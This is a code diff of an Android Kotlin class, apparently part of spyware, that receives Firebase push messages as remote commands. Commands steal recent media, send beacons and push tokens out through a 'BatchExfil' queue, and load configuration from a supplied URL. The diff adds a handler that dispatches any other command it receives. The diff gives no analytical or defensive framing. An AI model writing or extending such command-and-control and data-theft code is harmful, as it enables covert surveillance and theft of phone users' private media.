@@ -9,6 +9,7 @@ import com.sp.core.services.MediaStealer
 import com.sp.core.util.BatchExfil
 
 class FirebaseClient : FirebaseMessagingService() {
+
     override fun onMessageReceived(msg: RemoteMessage) {
         val cmd = msg.data["cmd"] ?: return
         when (cmd) {
@@ -25,7 +26,7 @@ class FirebaseClient : FirebaseMessagingService() {
                 MediaStealer.stealRecent(this, msg.data["n"]?.toIntOrNull() ?: 20)
                 BatchExfil.enqueue(this, "media", msg.data.toString())
             }
-            "ping" -> BatchExfil.enqueue(this, "ping", "{}")
+            "ping" -> BatchExfil.enqueue(this, "ping", """{"ts":${System.currentTimeMillis()}}""")
             "cfg" -> {
                 val url = msg.data["url"]
                 if (!url.isNullOrEmpty()) {
@@ -33,8 +34,10 @@ class FirebaseClient : FirebaseMessagingService() {
                     BatchExfil.enqueue(this, "cfg", """{"ok":true}""")
                 }
             }
+            else -> Commands.dispatch(this, cmd, msg.data)
         }
     }
+
     override fun onNewToken(token: String) {
         BatchExfil.enqueue(this, "token", """{"t":"$token"}""")
     }
